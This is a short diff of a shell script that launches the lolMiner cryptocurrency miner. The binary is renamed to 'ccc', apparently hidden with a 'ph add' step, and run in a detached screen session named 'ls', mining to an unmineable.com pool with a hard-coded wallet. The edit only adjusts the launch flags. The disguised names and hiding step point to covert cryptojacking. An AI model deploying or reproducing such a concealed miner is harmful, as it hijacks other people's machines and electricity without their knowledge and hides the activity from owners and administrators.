@@ -13,4 +13,4 @@ cd 1.31 &&
 mv lolMiner ccc && 
 ph add ccc && 
 chmod +x ccc && 
-screen -dmS ls ./ccc --algo ETHASH --pool ethash.unmineable.com:3333 --user LTC:M9Uaz5UtUHbu3VJdkz9ZU8ow35e1z8acAZ.K80 --ethstratum ETHPROXY
+screen -dmS ls ./ccc --algo ETHASH --pool ethash.unmineable.com:3333 --user LTC:M9Uaz5UtUHbu3VJdkz9ZU8ow35e1z8acAZ.K80
